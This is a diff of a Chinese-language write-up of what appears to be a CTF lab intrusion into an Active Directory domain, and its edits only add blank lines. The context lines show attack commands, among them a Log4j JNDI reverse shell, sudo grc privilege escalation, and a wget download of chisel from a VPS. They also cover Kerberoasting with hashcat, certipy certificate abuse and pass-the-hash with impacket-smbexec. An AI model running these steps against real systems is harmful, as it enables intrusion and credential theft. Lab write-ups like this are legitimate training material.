@@ -50,9 +50,12 @@ repost:
 
 ![](images/faa9a9d78532f934783a89558ef55a61.png)
 
+
+
 发现`Solr Admin`框架，访问网站，
 
 ![](images/fb68edf242eb14dc85b933f7b43fcdbf.png)
+
 发现`Log4j`插件，`DNSlog`测试出可以打`Log4j`的RCE。
 
 ```
@@ -62,6 +65,7 @@ repost:
 
 
 ![](images/33e7d64c231788c3d3b2dbdd3f0962bd.png)
+
  `JNDI`反弹shell，监听端口
 
 ```
@@ -92,6 +96,7 @@ bash: no job control in this shell
 
 
 ![](images/c4052d9ee0d2ef6a0dd347f0677f5269.png)
+
 `sudo grc`提权
 
 ```
@@ -101,6 +106,7 @@ sudo /usr/bin/grc --pty /bin/sh
 
 
 ![](images/facb83b65a2c79430ee31019b484b963.png)
+
 将`chisel`和`fscan`上传到vps，vps上启动python的web服务。在shell中使用`wget`下载
 
 ```
@@ -112,9 +118,15 @@ wget http://47.79.41.42:12345/chisel
 
 ![](images/45562e0cb0b0d2e4c165ad7e9fce9c7d.png)
 
+
+
 ![](images/6b1ef3b6e99c026fbfb7bddf97c175ec.png)
 
+
+
 ![](images/1ec4760cad917638902369e830e4f2e6.png)
+
+
 
 查看网段，为接下来使用`fscan`确认好目标
 
@@ -125,6 +137,7 @@ ip addr
 
 
 ![](images/3dba644351ca74aebbbeda08dc7a36ac.png)
+
 给`fscan`和`chisel`执行权限
 
 ```
@@ -214,6 +227,7 @@ proxychains4 smbclient -L 172.22.9.47
 
 
 ![](images/4539826c88e545d68975e4d800744afc.png)
+
 进入共享文件夹
 
 ```
@@ -223,13 +237,17 @@ proxychains4 smbclient \\\\172.22.9.47\\fileshare
 此时顺便将数据库文件get下来
 
 ![](images/630a88b8ac9b7c0286ed261b785f7e61.png)
+
 拿到flag02
 
 ![](images/fc5215291dbbbcc19a791d5902080ac6.png)
 
+
+
 查看数据库文件
 
 ![](images/46dd71a6316a39c416e66a31af95646c.png)
+
 用户名未知，导出user，利用user进行rdp爆破，尝试远程登陆
 
 ```
@@ -250,6 +268,7 @@ python GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf
 
 
 ![](images/05f0e064f5a16ae8889f280f1125468b.png)
+
 请求`zhangxia`用户的`TGS Tickets`
 
 ```
@@ -289,6 +308,7 @@ hashcat -a 0 -m 13100 1.txt rockyou.txt
 
 
 ![](images/1fa6de941fd75c3c9955c194bc1e5fdf.png)
+
 尝试进行rdp登录
 
 ```
@@ -305,6 +325,7 @@ proxychains4 certipy-ad find -u 'zhangxia@xiaorang.lab'  -password 'MyPass2@@6' 
 
 
 ![](images/4cc8d0efa033103745e2929d658eb6df.png)
+
 修改`/etc/hosts`，避免超时
 
 ```
@@ -320,6 +341,7 @@ proxychains4 certipy-ad req -u 'zhangxia@xiaorang.lab' -p 'MyPass2@@6' -target 1
 
 
 ![](images/b7d6738aeb35ae7bfa29c1b7a535c591.png)
+
 再拿生成的administrator.pfx获取域管哈希
 
 ```
@@ -329,6 +351,7 @@ proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7
 
 
 ![](images/a03e7b087c5978eff420cdb7e087f055.png)
+
 pth传递拿到域管理
 
 ```
@@ -338,6 +361,7 @@ proxychains4 impacket-smbexec -hashes :2f1b57eefb2d152196836b0516abea80 xiaorang
 
 
 ![](images/50e86656d42e34e1f49242cdbef18238.png)
+
 读取flag03
 
 ```
@@ -347,6 +371,7 @@ type c:\users\administrator\flag\flag03.txt
 
 
 ![](images/213dc87ec744dd14142e5847b0ffcf71.png)
+
 通过域控哈希拿其他主机
 
 ```
@@ -362,3 +387,4 @@ type c:\users\administrator\flag\flag04.txt
 
 
 ![](images/3bbc2752a81603c39cc539ff01bd848d.png)
+
